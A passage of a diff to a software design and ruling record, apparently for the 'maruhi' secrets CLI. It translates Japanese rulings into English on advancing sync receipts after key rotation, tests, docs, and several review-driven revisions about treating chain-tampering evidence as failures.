-`sync ack` には「その version は再暗号化で平文が不変」と「誰かが新しい値を push した」を区別する材料が無く、進めてよいかを
-判定できない(平文の不変を知るのはローテーションの実行者の CLI だけ)。(i) で `--config` を渡したが設定が壊れている / 別
-プロジェクトの場合、**エポックを進めた後に落ちると後始末の不備がローテーションの失敗に見える** → 設定はネットワークより先に読み、
-`project` の照合(`--project` の有無に関わらず解決済みのプロジェクト ID と比べる — 既存の `checkConfigProject` はフラグとしか
-比べない)は `openEnvironment` の直後・`envRotateOp` の**前**に置く(食い違いは書き方の誤り = 2、`rotate` は呼ばれない)(なし)。
-**選定 = (i)**。フラグ名は sync 系と同じ `--config`、説明文は「明示時のみ進める・既定なし」を言う(既定パスがある sync 系の
-文とは別)。棄却: (ii)(誤設定の黙認)、(iii)(判定材料が無い)、(iv)(無関係な note)。
+**B. How the config is given and the trigger condition** — enumeration: (i) only when `env rotate --config <path>` is explicit / (ii) automatic when cwd has `maruhi.sync.json` / (iii) a dedicated command `maruhi sync ack <target>` (rotate only guides at the end). Round-1 new option: (iv) a note at the end guiding `maruhi sync plan` when `--config` is absent (no — an unrelated note on every rotation for users who don't use sync. Overlaps the existing anchor-update note. docs covers it). Round 2 (failure modes): (ii) silently uses a `project`-less config when run in another project's repo, then goes reading receipts for environments that don't exist (`--config` explicit = the user's assertion). (iii) **violates M1's core**: a later `sync ack` has no material to distinguish "that version is a re-encryption, plaintext unchanged" from "someone pushed a new value", so it can't decide whether advancing is safe (only the rotation executor's CLI knows the plaintext is unchanged). Under (i), if `--config` was passed but the config is broken / another project's, **failing after the epoch advanced makes a cleanup fault look like a rotation failure** → the config is read before the network, and the `project` check (compared against the resolved project ID regardless of `--project` presence — the existing `checkConfigProject` only compares against the flag) sits right after `openEnvironment`, **before** `envRotateOp` (a mismatch is a usage error = 2 and `rotate` isn't called) (no). **Chosen = (i)**. The flag name is the same `--config` as the sync family; its description says "advances only when explicit; no default" (distinct from the sync family's wording which has a default path). Rejected: (ii) (silently accepting a wrong config), (iii) (no material to judge), (iv) (an unrelated note).
 
-**C. 全環境ローテーション(`server revoke` / `member remove` / 降格)** — 列挙: (i) M1 の対象外(docs に「その後の plan は
-全変数を changed と示す。無害」と明記)/ (ii) これらにも `--config` を足す / (iii) 共通の後始末を `envRotateOp` の外側に置き、
-両経路から呼ぶ。第 1 周の新案: なし。第 2 周(壊れ方): (ii) は退職者対応 = 緊急操作で、設定ファイルの所在(cwd)を前提に
-しにくく、全環境を回すので「どの環境のレシートを」が設定 1 つでは閉じない(複数リポジトリ)。取りこぼしの回収経路: 後から
-`env rotate --config` を打ち直しても up-to-date = 新 version は増えず進まないが、**次の apply が同じ平文を書き直す**(無害・
-冪等)ので回収は自然に起きる。(iii) は (ii) と同じ前提を要る。**選定 = (i)**。sync-rotate.ts は `envRotateCommand` だけが
-呼び、`sweepRotateFor` は型の追加(`written`)以外に触れない。棄却: (ii) / (iii)(緊急操作に設定を持ち込む)。
+**C. Whole-environment rotation (`server revoke` / `member remove` / demotion)** — enumeration: (i) out of M1's scope (docs states "a subsequent plan shows every variable as changed. Harmless") / (ii) give these a `--config` too / (iii) place the shared cleanup outside `envRotateOp` and call it from both paths. Round-1 new option: none. Round 2 (failure modes): (ii) is a leaver response = an emergency operation where a config file's location (cwd) is a poor premise, and rotating all environments means "which environment's receipts" doesn't close with a single config (multiple repos). The recovery path for misses: re-running `env rotate --config` afterward is up-to-date = no new versions and nothing advances, but **the next apply rewrites the same plaintext** (harmless, idempotent), so recovery happens naturally. (iii) needs the same premise as (ii). **Chosen = (i)**. Only `envRotateCommand` calls sync-rotate.ts; `sweepRotateFor` is untouched except the type addition (`written`). Rejected: (ii) / (iii) (bringing config into an emergency operation).
 
-**D. 前進の規則と書き方** — 進める条件は不変条件のとおり: `written` の (name, v) について `receipt.variables[name] === v − 1`
-のときだけ v へ(**厳密一致**。v−1 より小さい = 遅れ、大きい = 別系統のレシート、無い = 未同期 — いずれも据え置き)。複数
-ターゲット: 設定の順にすべて処理し、1 つの失敗(読み・書き)は警告して次へ(終了コードは変えない)。ビュー: ローテーションで
-チェーンは前進しているので、後始末は `context.resync` した検証済みビューから始め、各ターゲットの `loadReceipt` が返す前進した
-ビューを次へ引き継ぐ(第 1 段の改訂 1 と同じ規律)。床: レシート環境が回した環境と同じなら rotate の床ハンドルを共有し(前提 (3)
-により実際にはターゲットが無く読みも書きも起きないが、同じ環境に 2 つのハンドルを開かない規律は構造で守る)、違えば
-`floorHandleFor`。`preset` は据え置き、`syncedAt` は書き手の時計(表示用)。**内容が変わらなければ書かない**(進めた名前が
-0 なら version を消費しない)。900 警告は書いた後の version で出す(M1 の書き込みも version を消費する — 申し送りの「早める」点)。
-第 1 周の新案: 遅れの判定を `select` されている名前(ターゲットの `variables` / `exclude`)に限る案(なし — レシートにある名前は
-過去に届けた名前であり、ターゲットから外れていても「その version の平文が届いている」事実は変わらない。進めても plan は `-`
-〔no longer synced〕と示し、判定に選択を混ぜる意味が無い)。第 2 周(壊れ方): 別のメンバーが同時に apply して 409 → `pushVariable`
-の内部再試行(勝者を prev にして再送)。二重書きは無害(同じ写像を積むだけ。apply 側は `sameVariables` で書かない)。部分完了
-(`remaining > 0`、終了コード 1)でも受理済みの分は進める(受理は取り消せない。進めないと次の apply が余計に書き直す)。
-`--new-epoch` で未完了の旧エポック値を一気に新エポックへ揃えた場合も、v−1 の照合だけで正しく判定できる(中間エポックを
-経由しない — 直前 version は 1 つ)(なし)。
+**D. The advance rule and how it's written** — the advance condition is exactly the invariant: for each (name, v) in `written`, advance to v only when `receipt.variables[name] === v − 1` (**exact match**. Smaller than v−1 = behind; larger = a receipt of a different lineage; absent = never synced — all left as-is). Multiple targets: process all in config order; one failure (read or write) warns and moves on (exit code unchanged). View: since the chain advanced during rotation, cleanup starts from a `context.resync`'d verified view, and each target's `loadReceipt`-returned advanced view is handed to the next (same discipline as stage 1 revision 1). Floor: if the receipt environment equals the rotated one, share rotate's floor handle (per premise (3) there'd actually be no targets and no reads or writes happen, but the never-open-two-handles-on-one-environment discipline is kept structurally); otherwise `floorHandleFor`. `preset` is kept; `syncedAt` is the writer's clock (display only). **Nothing is written when the content wouldn't change** (zero advanced names → don't consume a version). The 900 warning uses the post-write version (M1's write also consumes a version — the "earlier" point from the handoff). Round-1 new option: limit behind-detection to names `select`ed by the target (`variables` / `exclude`) (no — a name on the receipt is a name once delivered, and even if it fell off the target the fact "a plaintext of that version was delivered" is unchanged. Advancing just makes plan show `-`〔no longer synced〕; mixing selection into the judgment is meaningless). Round 2 (failure modes): another member's concurrent apply → 409 → `pushVariable`'s internal retry (re-send with the winner as prev). Double-writing is harmless (just re-applies the same mapping; the apply side doesn't write thanks to `sameVariables`). On partial completion (`remaining > 0`, exit code 1) the accepted portion still advances (acceptance can't be un-done; not advancing makes the next apply rewrite extra). Even when `--new-epoch` flushed all incomplete old-epoch values to the new epoch at once, the v−1 comparison judges correctly (no intermediate epoch exists — the previous version is unique) (no).
 
-**E. 出力** — 1 ターゲット 1 行(`Advanced the receipt for target web to the re-encrypted versions of 2 variables (saved as
-version 5 of sync-receipt:web in environment ops)`)。据え置いた分は同じ行に `; 1 variable left as delivered (API_KEY: the receipt
-was already behind before the rotation, so the next `maruhi sync plan` shows them as pending)`(名前は `displayText`)。進めた
-名前が 0 で据え置きだけなら `Receipt for target web not advanced: …`。レシートが無い・確認だけ(`written` 空)は静か。
-回した環境を同期元にするターゲットが無ければ `No sync target in the config is synced from environment dev, so no receipt was
-advanced` の 1 行。失敗は `logWarning`(「the rotation is done, but the receipt … could not be advanced (…). The next
-`maruhi sync plan <target>` shows the re-encrypted variables as pending; applying again overwrites them with the same plaintext」
-— saveReceipt と同じ方向)。順序: `reportRotation`(警告 → Done / Partial の行 → 終了コード)→ アンカー更新の note → レシートの行
-(改訂 4 で note を後始末の前へ。既存の順序と終了コードを崩さない)。値・平文の長さ・レシートの中身は出さない。
+**E. Output** — one line per target (`Advanced the receipt for target web to the re-encrypted versions of 2 variables (saved as version 5 of sync-receipt:web in environment ops)`). The left-as-is part shares the line: `; 1 variable left as delivered (API_KEY: the receipt was already behind before the rotation, so the next `maruhi sync plan` shows them as pending)` (names via `displayText`). If zero names were advanced and only left-as-is exist: `Receipt for target web not advanced: …`. No receipt / confirmation-only (`written` empty) is quiet. If no target is synced from the rotated environment, one line: `No sync target in the config is synced from environment dev, so no receipt was advanced`. Failures are `logWarning` ("the rotation is done, but the receipt … could not be advanced (…). The next `maruhi sync plan <target>` shows the re-encrypted variables as pending; applying again overwrites them with the same plaintext" — same direction as saveReceipt). Order: `reportRotation` (warnings → the Done / Partial line → exit code) → the anchor-update note → the receipt lines (revision 4 moved the note ahead of cleanup. Doesn't break the existing order or exit code). Values, plaintext lengths, and receipt contents are never printed.
 
-**I. テスト** — フィクスチャの列挙: (i) `env-rotate.test.ts` の `makeServer` を 2 環境に拡張 / (ii) `value-env.ts` に
-`rotate_epoch` の複合受理と epoch の前進を足す / (iii) 両者を**合成**する。第 1 周の新案: なし。第 2 周(壊れ方): (ii) は
-makeServer の複合受理(チェーン追記・ラップの配布・境界 checkpoint・スナップショット)の写しになる。(i) は makeServer が
-`ENV_ID` 固定の 300 行で、2 環境化は既存 70 テストの前提を動かす。(iii) は makeServer(回す環境 dev)の handlers を先に置けば
-チェーンは makeServer の可変な現在形が勝ち、`makeValueEnvironmentServer`(レシート環境 ops、epoch 1 固定)は自環境のパスしか
-見ないので**支援モジュールを変えずに**合成できる(なし)。**選定 = (iii)**、置き場は `env-rotate.test.ts` 末尾の
-`describe("maruhi env rotate --config …")`(makeServer がファイル内なので)。固定した態(14): 完了 → 進む + その後の `sync plan`
-が全件 unchanged + `sync apply` が `Nothing to apply`(二重書き無し・ベンダー CLI 起動 0)/ `--config` 無し = レシート環境への
-リクエスト 0 / 遅れていた変数は据え置き(`~ API_KEY version 1 -> 3`)/ レシートに無い名前は据え置き・進めるものが無ければ書かない /
-`alreadyCurrent` は据え置き(勝者の平文は plan が update と示す)/ `remaining > 0` は完了分だけ・終了コード 1 のまま / resumed は
-再開分だけ(前回の実行が進めた変数は触らない)/ レシート環境自身のローテーション(レシート変数が再暗号化されるだけ・その後の
-plan は unchanged)/ レシート無し = 静か / 複数ターゲット + 1 つの書き込み失敗(警告・残りは進む・終了コード 0)/ 900 警告 /
-`project` の食い違い = 2 で rotate 未送信 / 設定不在 = 1 で rotate 未送信 / up-to-date = 触らない。加えて `redacted.test.ts` の
-棚卸し表(変更なし)、`--help` golden、`message-style.test.ts`、fallow(未使用 export を非公開に)。
+**I. Tests** — fixture enumeration: (i) extend `env-rotate.test.ts`'s `makeServer` to 2 environments / (ii) add `rotate_epoch`'s compound acceptance + epoch advancement to `value-env.ts` / (iii) **compose** the two. Round-1 new option: none. Round 2 (failure modes): (ii) duplicates makeServer's compound acceptance (chain appends, wrap distribution, boundary checkpoints, snapshots). (i): makeServer is 300 lines pinned to `ENV_ID`; making it two environments shifts the premise of the existing 70 tests. (iii): placing makeServer's handlers first (rotated environment dev) lets the chain win via makeServer's mutable current state, and since `makeValueEnvironmentServer` (receipt environment ops, epoch fixed at 1) only sees its own environment's paths, the two **compose without touching the support modules** (no). **Chosen = (iii)**, located at `env-rotate.test.ts`'s tail `describe("maruhi env rotate --config …")` (makeServer lives inside the file). Pinned cases (14): complete → advances + a subsequent `sync plan` shows all unchanged + `sync apply` says `Nothing to apply` (no double write, vendor CLI never started) / no `--config` = zero requests to the receipt environment / a behind variable is left as-is (`~ API_KEY version 1 -> 3`) / names absent from the receipt are left as-is; nothing written when nothing advances / `alreadyCurrent` is left as-is (plan shows the winner's plaintext as update) / `remaining > 0` advances only the completed ones, exit code stays 1 / resumed advances only the resumed portion (variables advanced by the previous run are untouched) / rotating the receipt environment itself (the receipt variable merely gets re-encrypted; the subsequent plan is unchanged) / no receipt = quiet / multiple targets + one write failure (warns, the rest advance, exit code 0) / the 900 warning / `project` mismatch = 2 and rotate never sent / missing config = 1 and rotate never sent / up-to-date = untouched. Plus `redacted.test.ts`'s inventory table (unchanged), `--help` golden, `message-style.test.ts`, fallow (unused exports made private).
 
-**J. docs** — `deploy-targets.mdx`「Receipts」の 1 点目を実挙動へ(`--config` の使い方・進める条件を「平文の不変を知るのは
-ローテーション自身だけ」として説明・据え置く 3 つの場合・`--yes` 不要・`--config` 無しと全環境ローテーションでは進まない = 無害)。
-index / README は `maruhi sync` の紹介のみで変更不要。
+**J. docs** — the first point of `deploy-targets.mdx`'s "Receipts" updated to actual behavior (how `--config` is used; the advance condition explained as "only the rotation itself knows the plaintext is unchanged"; the 3 leave-as-is cases; no `--yes` needed; nothing advances without `--config` or under whole-environment rotation = harmless). index / README only introduce `maruhi sync` — no change needed.
 
-**K. ROADMAP と裁定録** — SY2 行の 2b を完了注記へ(日付・PR 番号・裁定の要約)。SY2 全体は第 3 段が残るので完了にしない。
-本節を第 2 段の末尾に追記。
+**K. ROADMAP and ruling record** — SY2 row's 2b to a completion note (date, PR number, summary of rulings). SY2 as a whole isn't marked complete since stage 3 remains. This section is appended to stage 2's tail.
 
-**不変条件の確認**: 仕様改訂なし(暗号操作の追加なし。レシートの前進は `storeReceipt` = §4.1 の署名つきの普通の push。
-チェーン・wire・サーバー・Web・`packages/crypto` は無変更)/ 平文の不変を確かめずに進めない(`written` × 直前 version の厳密一致)/
-ディスクレス(剥がす場所は増えない — 棚卸し表は据え置き。出力は名前・件数・version のみ)/ 一方通行(maruhi サーバーとしか
-話さない。同期先は読まない・書かない)/ CI では書けない(`ci sync` / `ci run` は無変更。`env rotate` は master 鍵を持つ人間の経路)/
-失敗の方向(後始末の失敗は警告・終了コード不変。迷う変数は据え置き)/ ADR-0016(型付きエラー・stdout はコマンドの出力だけ・
-通知は notice.ts・`process.*` は live.ts のみ・新フラグは決定 5 の範囲・golden / message-style)/ 英語 / 依存ゼロ / エージェント環境の
-新しいゲート無し / スコープ(第 3 段・`--all`・Vercel の一覧の続き・SY3〜SY5 は取り込まない)。
+**Invariant check**: no spec revision (no crypto operations added. Receipt advance is `storeReceipt` = an ordinary §4.1-signed push. Chain / wire / server / web / `packages/crypto` unchanged) / nothing advances without proof the plaintext is unchanged (`written` × exact match on the previous version) / diskless (no new unwrap site — the inventory table stays; output is names / counts / versions only) / one-way (talks only to the maruhi server. The destination is neither read nor written) / CI can't write (`ci sync` / `ci run` unchanged. `env rotate` is a human path holding the master key) / failure direction (cleanup failure = a warning, exit code unchanged. Ambiguous variables are left as-is) / ADR-0016 (typed errors, stdout is only the command's output, notifications via notice.ts, `process.*` only in live.ts, new flags within decision 5's scope, golden / message-style) / English / zero dependencies / no new agent-environment gates / scope (stage 3, `--all`, the rest of Vercel's listing, SY3–SY5 not pulled in).
 
-**改訂 1(2026-09-07、Cursor Bugbot〔3a88be0〕)**: 後始末の入口で `context.resync` を**受け皿の外**で評価しており、
-`reportRotation` が成功を報告した後に再同期が失敗すると、コマンドが失敗して終了コードが 1 に化け、アンカー更新の note も
-出なかった(`written` が空で何も触らない実行でも)。裁定 D の「後始末の失敗は警告」が再同期には掛かっていなかった穴 →
-再同期を `advanceReceiptsAfterRotation` の内側へ移し、`written` 空 / ターゲット無しの早期終了の**後**で評価し、失敗は
-「the rotation is done, but the receipts could not be advanced because the chain could not be re-verified (…)」の警告に畳む。
-再暗号化が終わった後のチェーン取得だけを落とす態(終了コード 0・レシート書き込み 0・アンカーの note は出る)で固定。
+**Revision 1 (2026-09-07, Cursor Bugbot〔3a88be0〕)**: the cleanup's entrance evaluated `context.resync` **outside the catch-all**, so when re-sync failed after `reportRotation` had already reported success, the command failed and the exit code became 1, and the anchor-update note never printed either (even on runs where `written` was empty and nothing was touched). The hole: ruling D's "cleanup failure is a warning" wasn't covering re-sync → re-sync moved inside `advanceReceiptsAfterRotation`, evaluated **after** the early exits for empty `written` / no targets, and a failure folds into the warning "the rotation is done, but the receipts could not be advanced because the chain could not be re-verified (…)". Pinned as the shape where only the post-re-encryption chain fetch fails (exit code 0, zero receipt writes, the anchor note still prints).
 
-**改訂 2(2026-09-07、pullfrog の初回レビュー〔3a88be0〕)**: (1) 裁定 D の「後始末の失敗は警告」がレシート環境の**検証拒否**
-(床違反・チェーン置換・equivocation = `CliError.evidence`)まで畳んでいた。改竄の証拠を「the receipt … could not be advanced (…);
-applying again overwrites them with the same plaintext」という**誤った案内**で包み、終了コード 0 で終える形 → 裁定 D の範囲を
-「通信・権限・競合の失敗(再同期・読み・書き)」に限定し、証拠だけはそのまま失敗として通す(`asCleanupOutcome` — env-rotate.ts の
-再走査が証拠を即時中断にするのと同じ規律。ローテーション自体は済んでいるので報告は先に出ている)。モジュール冒頭に範囲を明記。
-態を 2 つ追加: レシート環境の**読み**の通信失敗(pull の 503)= 警告・終了コード 0・書き込み 0 / レシート環境の value-version
-rollback(先に `sync plan` で床を確立してから古い version を配る)= 証拠として終了コード 1・書き込み 0・「Done: rotated」は出ている。
-(2) `--config` 指定の確認だけの実行でも `context.resync` が無条件に走っていた(往復 1 回の無駄)— 改訂 1 で早期終了の後ろへ
-移したので解消済み。(3) 第 1 段の改訂 1 の記述(JSON の逃がし形の列挙)がバッククォートの整形で `\\` を失っていた → 復元。
+**Revision 2 (2026-09-07, pullfrog's first review〔3a88be0〕)**: (1) ruling D's "cleanup failure is a warning" had been folding even the receipt environment's **verification refusals** (floor violations, chain replacement, equivocation = `CliError.evidence`). Tampering evidence was being wrapped in the **wrong guidance** "the receipt … could not be advanced (…); applying again overwrites them with the same plaintext" and ended with exit code 0 → ruling D's scope is now limited to "communication / permission / contention failures (re-sync, reads, writes)", and evidence alone passes through as a failure (`asCleanupOutcome` — same discipline as env-rotate.ts's re-scan aborting immediately on evidence. The rotation itself is done, so the report has already printed). The scope is stated at the module head. 2 cases added: the receipt environment's **read** failing on communication (a pull 503) = warning, exit code 0, zero writes / a value-version rollback on the receipt environment (establish the floor via `sync plan` first, then serve an old version) = evidence, exit code 1, zero writes, "Done: rotated" already printed. (2) On a `--config`-given confirmation-only run, `context.resync` ran unconditionally (a wasted round trip) — resolved by revision 1's move behind the early exits. (3) Stage 1 revision 1's description (enumerating the JSON escaped forms) had lost `\\` to backtick formatting → restored.
 
-**改訂 3(2026-09-07、pullfrog の差分レビュー〔054b640〕)**: 改訂 2 の証拠の仕分けは `CliError.evidence` を見るが、`context.resync`
-(= `syncProject` / `resyncExtended`)の**チェーン検証の拒否**(署名 / ハッシュ連鎖の不成立・genesis 不一致 = チェーン差し替え・
-申告ヘッドの不一致・検証済みビューの延長でない)は `cliError` で作られており、文面が「evidence of server-side chain replacement」と
-言いながら `evidence` フラグを持たなかった → 後始末では改竄されたチェーンが警告 + 終了コード 0 に畳まれる(loadReceipt 内の有界
-再同期でも同じ)。候補: (i) sync-rotate.ts で文面を見て仕分ける(脆い)/ (ii) 後始末の再同期を丸ごと失敗にする(改訂 1 の
-逆戻り — 503 で終了コードが変わる)/ (iii) **発生源(sync.ts)で証拠として分類する**。(iii) を採る: errors.ts の `evidence` の定義
-(「署名検証済みデータとチェーン公証・床の矛盾 — 再実行では解消しない」)にこの 4 つは元から該当し、暗号ランタイムの失敗
-(「failed to run」・鍵索引の導出)だけを据え置く(空チェーンは `verifyChainCore` が `ChainInvalid` / `empty-chain` として
-検証段で拒否するので証拠側に入る — sync.ts の `"The chain is empty"` には到達しない。改訂 5 で記述を訂正)。副作用として env-rotate.ts の巡末再走査(`settlePass`)がこれらを
-「未検証(再実行で直る)」でなく「証拠(即時中断)」に分類するようになるが、それは文面が既に主張していた分類であり、既存テストは
-全件通る。態を追加: 再暗号化後に同じ genesis の短いチェーンを配る(検証は通るが延長でない)= 終了コード 1・「not an extension」・
-書き込み 0・「Done: rotated」は出ている。あわせて、後始末の再同期は `context.resync`(= 素の `syncProject`。延長検査を持たない)
-でなく `resyncExtended(resync, context.verified)` で行い、ローテーション前の検証済みビューの**延長**であることを確かめる
-(延長検査なしでは、別の整合チェーンが「環境が存在しない」という通常の失敗に化けて警告に畳まれる — この態を書く過程で判明)。
+**Revision 3 (2026-09-07, pullfrog's diff review〔054b640〕)**: revision 2's evidence sorting looks at `CliError.evidence`, but `context.resync` (= `syncProject` / `resyncExtended`)'s **chain-verification refusals** (signature / hash-chain failure, genesis mismatch = chain replacement, declared-head mismatch, not an extension of the verified view) are built via `cliError`, so despite saying "evidence of server-side chain replacement" in the message they didn't carry the `evidence` flag → in cleanup, a tampered chain would fold into a warning + exit code 0 (same inside loadReceipt's bounded re-sync). Candidates: (i) sort by message text in sync-rotate.ts (fragile) / (ii) fail the whole cleanup re-sync (a return to revision 1 — a 503 changes the exit code) / (iii) **classify as evidence at the source (sync.ts)**. (iii) adopted: errors.ts's `evidence` definition ("a contradiction between signature-verified data and chain notarization or the floor — doesn't resolve on retry") already covered these 4; only crypto-runtime failures ("failed to run", key-index derivation) stay. (An empty chain is refused at verification as `ChainInvalid` / `empty-chain` by `verifyChainCore`, so it lands on the evidence side — sync.ts's `"The chain is empty"` is never reached. Description corrected in revision 5.) As a side effect, env-rotate.ts's round-end re-scan (`settlePass`) now classifies these as "evidence (immediate abort)" rather than "unverified (fixed by retry)" — which is the classification the wording had already been claiming; all existing tests pass. A case was added: post-re-encryption serving of a shorter chain with the same genesis (verifies but isn't an extension) = exit code 1, "not an extension", zero writes, "Done: rotated" already printed. Along with that, the cleanup re-sync is `context.resync` (= the plain `syncProject`. It has no extension check)
+ — replaced by `resyncExtended(resync, context.verified)`, which confirms it is an **extension** of the pre-rotation verified view (without the extension check, a different consistent chain degrades into the ordinary "environment doesn't exist" failure and folds into a warning — discovered while writing this case).
 
-**改訂 4(2026-09-07、pullfrog の差分レビュー〔524c8a2〕)**: 後始末が証拠で失敗できるようになった(改訂 2 / 3)ことで、
-その後ろに置いていたアンカー更新の note(`mode === "rotated"`)が証拠の経路で出なくなっていた — エポックは進んでおりアンカーの
-陳腐化は後始末の成否と無関係。裁定 E の出力順を「報告 → アンカーの note → レシートの行」に改め(note を後始末の前へ)、床違反 /
-チェーン差し替えの 2 態で note が出ることを断言に足した。同レビューの「証拠の仕分けがチェーン検証の拒否を覆っていない」は
-改訂 3 で対応済み(レビューは 524c8a2 に対するもの)。
+**Revision 4 (2026-09-07, pullfrog's diff review〔524c8a2〕)**: now that cleanup can fail on evidence (revisions 2 / 3), the anchor-update note (`mode === "rotated"`) placed after it was no longer printed on the evidence path — yet the epoch has advanced and anchor staleness is unrelated to cleanup's success. Ruling E's output order was changed to "report → anchor note → receipt lines" (the note moved before cleanup), and assertions gained that the note prints under the 2 evidence cases (floor violation / chain replacement). The same review's "the evidence sorting doesn't cover chain-verification refusals" was already handled in revision 3 (the review targeted 524c8a2).
 
-**改訂 5(2026-09-07、pullfrog の差分レビュー〔fad7e29〕)**: 裁定録の改訂 3 の記述で「空チェーンは据え置き」と書いていたが、空
-チェーンは `verifyChainCore` が `ChainInvalid`(`empty-chain`)として先に拒否し、改訂 3 の `evidenceError` 側に入る(`sync.ts` の
-`"The chain is empty"` には到達しない)。据え置きは暗号ランタイムの失敗(「failed to run」・鍵索引の導出)だけ。コードの変更なし。
+**Revision 5 (2026-09-07, pullfrog's diff review〔fad7e29〕)**: the ruling record's revision-3 description had written "empty chain is kept as-is", but an empty chain is refused earlier by `verifyChainCore` as `ChainInvalid` (`empty-chain`) and lands on revision 3's `evidenceError` side (sync.ts's `"The chain is empty"` is never reached). Only crypto-runtime failures ("failed to run", key-index derivation) are kept as-is. No code change.
 
-**改訂 6(2026-09-07、Cursor Security Agent〔cdaa1b9〕)**: 改訂 3 はチェーン(`sync.ts`)側だけで、レシート環境の pull /
-push の経路(`values.ts`)にも `evidence` を持たない検証拒否が残っていた — 検証段(`verifyStage`)の rejected(ステートメント /
-値署名 / マニフェストの不成立)、有界再同期の後もチェーン上に無い位置へ束縛された配布(`divergedMessage` — 文面は「evidence of
-chain divergence or forgery」)、メタデータ pull の床違反、checkpoint 束縛のある環境でのマニフェスト握り潰し。これらは後始末の
-仕分けをすり抜けて警告 + 0 に畳まれる(レシートは進めないので未同期は隠れないが、証拠が「apply し直せ」の案内に隠れる)。改訂 3 と
-同じく発生源で `evidenceError` に(暗号ランタイムの失敗・名前の規約違反・マニフェスト欠落〔旧サーバーの可能性〕は据え置き)。
-副作用は改訂 3 と同じ範囲(`settlePass` の分類)。態を追加: レシート環境の値署名を壊す = 1・「could not be advanced」無し・書き込み 0・
-アンカーの note は出る。
+**Revision 6 (2026-09-07, Cursor Security Agent〔cdaa1b9〕)**: revision 3 covered only the chain side (`sync.ts`); verification refusals without `evidence` remained on the receipt environment's pull / push path (`values.ts`) — verification-stage (`verifyStage`) rejections (statement / value-signature / manifest failures), a distribution bound to a position not on the chain even after bounded re-sync (`divergedMessage` — the wording is "evidence of chain divergence or forgery"), floor violations on metadata pulls, and manifest swallowing on environments with checkpoint binding. These slipped through cleanup's sorting and folded into a warning + 0 (unsynced doesn't hide since the receipt doesn't advance, but the evidence hides behind "apply again" guidance). Same as revision 3, classified `evidenceError` at the source (crypto-runtime failures, naming-rule violations, missing manifest〔possibly an old server〕stay as-is). Side effects are the same scope as revision 3 (`settlePass`'s classification). A case was added: corrupt the receipt variable's statement signature = 1, no "could not be advanced", zero writes, the anchor note still prints.
 
-**改訂 7(2026-09-07、pullfrog の差分レビュー〔538d751〕)**: 改訂 6 の一括分類が `UnsupportedMetaLayout`(サポート範囲を超える
-layoutVersion — 裁定 CR で「改ざん疑いに潰さない誠実な破壊様式」と決めた形。文面も「This is not a tampering indication — update
-the maruhi CLI」)まで証拠に巻き込み、`settlePass` では「investigate the server's responses」、後始末では失敗に化けていた →
-`VerifyOutcome` の rejected に `evidence: boolean` を持たせ(checkpoint-integrity.ts と同じ形)、UnsupportedMetaLayout だけ false、
-`verifyStage` がそれで `evidenceError` / `cliError` を選ぶ。`partialLayoutMessage`(v2 欄の部分欠落 = 「an inconsistent server
-response」)は配布の自己矛盾なので証拠側のまま。態を追加: レシート変数のステートメントの layoutVersion を 3 にする = 警告・0・
-書き込み 0・「This is not a tampering indication」。
+**Revision 7 (2026-09-07, pullfrog's diff review〔538d751〕)**: revision 6's blanket classification swept even `UnsupportedMetaLayout` (a layoutVersion beyond the supported range — the shape ruling CR chose as "an honest destruction mode that doesn't collapse into tampering suspicion". The wording is also "This is not a tampering indication — update the maruhi CLI") into evidence, turning it into "investigate the server's responses" on `settlePass` and a failure on cleanup → `VerifyOutcome`'s rejected now carries `evidence: boolean` (same shape as checkpoint-integrity.ts), only UnsupportedMetaLayout is false, and `verifyStage` picks `evidenceError` / `cliError` by it. `partialLayoutMessage` (a partial omission of v2 columns = "an inconsistent server response") stays on the evidence side since it's a self-contradicting distribution. A case was added: set the receipt variable's statement layoutVersion to 3 = warning, 0, zero writes, "This is not a tampering indication".
 
-**第 3 段以降への申し送り**: (1) **第 3 段** = push 時同期 (c) / `gh workflow run` / autoSync(設定形式には枠を予約していない —
-未知キー拒否 + `version` で足せる。第 2 段の裁定 I)。書き手の CLI が `maruhi push` の直後に直接同期するか CI を起動するかは
-補足 7 P1 の線引き(書き手に同期先トークンを持たせない形が本命)で裁定する。(2) 全ターゲット一括の plan(`--all`)。(3) SY3 =
-workflow テンプレート 2 標準形 + 四眼の docs。(4) SY4 Netlify(http プリセットの宣言 1 つ + モック)。(5) SY5 gh プリセット。
-(6) 人間タスク(未消化・本 PR で追加なし): 実アカウント(Cloudflare / Vercel)での http / `ci sync` の通し、Vercel の一覧が
-ページ分けされる条件の実測、macOS のパイプ容量、`vercel env rm` の不在名の終了コード、文言の好み。(7) 全環境ローテーション後の
-レシートは次の apply が無害に書き直す(裁定 C)— 需要があれば `server revoke` / `member remove` に `--config` を足す改訂として
-別途裁定する。
+**Handoff to stage 3 onward**: (1) **stage 3** = push-time sync (c) / `gh workflow run` / autoSync (no slot reserved in the config format — unknown-key rejection + `version` allow adding. Stage 2's ruling I). Whether the writer's CLI syncs directly right after `maruhi push` or triggers CI is ruled by supplement 7 P1's line (the leading shape doesn't give the writer a destination token). (2) All-target plan (`--all`). (3) SY3 = workflow template's 2 standard forms + four-eyes docs. (4) SY4 Netlify (one http-preset declaration + a mock). (5) SY5 gh preset. (6) Human tasks (carried over, none added in this PR): end-to-end runs of http / `ci sync` on real accounts (Cloudflare / Vercel), measuring when Vercel paginates its listing, macOS pipe capacity, `vercel env rm`'s missing-name exit code, wording preferences. (7) Receipts after whole-environment rotation are harmlessly rewritten by the next apply (ruling C) — if demand exists, rule separately on adding `--config` to `server revoke` / `member remove`.
 
-#### 第 3 段(2026-09-08)
+#### Stage 3 (2026-09-08)
 
-SY2 の最終段 = **push 時同期 (c) / `gh workflow run` / autoSync**(PR #157)。設計は §3 冒頭「同期の最終形」の表
-(「運ぶ主体」の行: 値を変えられるのは人間だけ → 変更の瞬間には書き手の CLI がいる → 書き手の CLI が直接同期するか
-`gh workflow run` で CI を起動する)と補足 4 N1 / N2・補足 7 P1 / P2・補足 14 M8 が正で、蒸し返していない。出発点は 2b の
-申し送り (1): 設定形式には枠を予約していない(未知キー拒否 + `version` で足せる — 第 2 段の裁定 I)。書き手の CLI が直接同期
-するか CI を起動するかは補足 7 P1 の線引き(書き手に同期先トークンを持たせない形が本命)で裁定する。各裁定点は同じループで
-決め、「新案なし」の周では壊れ方(境界値・環境差・中断時の残骸・並行操作・二重実行・失敗の方向・エージェント環境)を問うた。
